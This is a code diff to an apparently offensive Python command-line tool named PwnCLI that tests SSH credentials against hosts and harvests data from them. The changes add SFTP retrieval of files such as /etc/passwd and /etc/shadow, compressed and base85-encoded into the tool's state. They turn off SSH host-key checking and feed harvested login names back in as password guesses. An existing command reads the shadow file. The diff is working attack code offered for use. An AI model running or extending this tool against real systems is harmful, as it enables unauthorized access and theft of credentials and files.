@@ -8,6 +8,8 @@ import logging
 from aiocmd import aiocmd
 import os
 from enum import Enum,auto
+import base64
+import zlib
 
 logging.basicConfig()
 logging.getLogger("asyncio").setLevel(logging.WARNING)
@@ -32,11 +34,13 @@ class NoCredsFound(Exception):
 
 
 class OS(object):
-    pass
-
-class Linux(OS):
     def __init__(self, node):
         self.node = node
+
+class Linux(OS):
+    @property
+    def file_list(self):
+        return self.node.config.linuxfile
 
     async def run(self, cmd):
         sout,serr = await self.node.run(cmd)
@@ -58,6 +62,9 @@ class Linux(OS):
         out,_ = await self.node.run("grep -v nologin /etc/passwd;grep -v ':!:' /etc/shadow")
         logins = set(x.split(":")[0] for x in out.splitlines())
         return list(logins)
+
+    async def collect_files(self):
+        files = ["/etc/passwd", "/etc/shadow", "/etc/fstab", "/etc/inittab"]
 
 class Mapping(object):
     _key = None
@@ -90,6 +97,14 @@ class Net(Mapping):
         ("scanned", False, bool),
     ]
 
+
+class LinuxFiles(Mapping):
+    _fields = [
+        ("path", "", str),
+    ]
+
+
+
 class Node(Mapping):
     _fields = [
         ("ip", "127.0.0.1", str),
@@ -101,6 +116,7 @@ class Node(Mapping):
         ("tested_credentials", [], list),
         ("working_credentials", [], list),
         ("os", None, str),
+        ("files", {}, dict),
     ]
 
     def __init__(self, **kargs):
@@ -110,8 +126,36 @@ class Node(Mapping):
         if self.values.get("os") == "linux":
             self.os = Linux(self)
 
+    async def run(self, cmd):
+        r = await self.session.run(cmd)
+        return r.stdout, r.stderr
+
+    async def get_file(self, path):
+        async with self.session.session.start_sftp_client() as sftp:
+            f = await sftp.open(path, "rb")
+            return await f.read()
+
+    async def get_files(self, *paths):
+        async with self.session.session.start_sftp_client() as sftp:
+            lst = await sftp.glob(paths)
+            content = await asyncio.gather(*[self.get_file(x) for x in lst if x not in self.files])
+        zcontent = [base64.b85encode(zlib.compress(c)).decode("ascii") for c in content]
+        d = dict(zip(lst, zcontent))
+        self.files.update(d)
+        return d
+
+
+    async def get_glob(self, pattern):
+        async with self.session.session.start_sftp_client() as sftp:
+            return await sftp.glob(pattern)
+
+
+    async def get_all_files(self):
+        lst = [f.path for f in  self.os.file_list]
+        return await self.get_files(*lst)
+
     async def test_creds(self, login, pwd):
-        opt = asyncssh.SSHClientConnectionOptions(username=login, password=pwd)
+        opt = asyncssh.SSHClientConnectionOptions(username=login, password=pwd, known_hosts=None)
 
         try:
             sess = await asyncssh.connect(host=self.ip, port=self.port, options=opt)
@@ -178,10 +222,6 @@ class Node(Mapping):
             return None
         return self.session
 
-    async def run(self, cmd):
-        r = await self.session.run(cmd)
-        return r.stdout, r.stderr
-
     async def collect(self):
         pass
 
@@ -193,7 +233,8 @@ class NodeSession(object):
         return f"<session to {self.node.ip}>"
     async def run(self, *args, **kargs):
         return await self.session.run(*args, **kargs)
-
+    async def start_sftp_client(self, *args, **kargs):
+        return await self.session.start_sftp_client(*args, **kargs)
 
 class Logins(Mapping):
     _fields = [
@@ -226,6 +267,7 @@ class Config(object):
         "login": Logins,
         "password": Passwords,
         "sshkey": SSHKeys,
+        "linuxfile": LinuxFiles,
     }
     def __init__(self, fname=None, json_=None):
         self.fname = fname
@@ -304,6 +346,11 @@ class PwnCLI(aiocmd.PromptToolkitCmd):
                 print(f"Connected to {nsession} (#{len(self.sessions)})")
                 self.sessions.append(nsession)
 
+    def cb_get_files(self, t):
+        files = t.result()
+        print(f"retrieved: {files}")
+
+
 
     async def do_cnx(self, hostnum):
         if hostnum == "all":
@@ -353,8 +400,30 @@ class PwnCLI(aiocmd.PromptToolkitCmd):
     async def do_collect(self, cnxnum):
         cnxnum = int(cnxnum)
         nsess = self.sessions[cnxnum]
-        print(await nsess.node.os.collect_logins())
+        logins = await nsess.node.os.collect_logins()
+        print(logins)
 
+        exising_logins = set(l.login for l in self.cfg.login)
+        exising_passwords = set(p.password for p in self.cfg.password)
+
+        for l in logins:
+            if l not in exising_logins:
+                lo = Logins(config=self.cfg, login=l)
+                self.cfg.login.append(lo)
+            if l not in exising_passwords:
+                p = Passwords(config=self.cfg, password=l)
+                self.cfg.password.append(p)
+
+    async def do_getfiles(self, cnxnum):
+        if cnxnum == "all":
+            nsess = self.sessions
+        else:
+            cnxnum = int(cnxnum)
+            nsess = [self.sessions[cnxnum]]
+        for sess in nsess:
+            t = asyncio.create_task(sess.node.get_all_files())
+            t.add_done_callback(self.cb_get_files)
+            
 
 def main(args=None):
     parser = argparse.ArgumentParser()
